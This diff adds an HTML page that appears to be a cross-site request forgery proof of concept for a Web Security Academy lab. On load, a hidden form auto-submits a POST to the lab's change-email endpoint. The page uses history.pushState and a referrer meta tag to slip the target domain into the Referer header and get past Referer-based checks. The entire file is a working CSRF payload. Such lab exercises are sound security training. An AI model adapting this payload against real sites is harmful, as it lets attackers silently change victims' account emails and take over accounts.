@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="u">
+    <meta name="referrer" content="https://acca1f451fdde8a9c05a356b0091004e.web-security-academy.net">
+    <title>Document</title>
+</head>
+<body>
+    <form method="POST" action="https://acca1f451fdde8a9c05a356b0091004e.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="wiener@normal-user.net">
+    </form>
+    <script>
+        history.pushState("", "", "/?https://acca1f451fdde8a9c05a356b0091004e.web-security-academy.net")
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
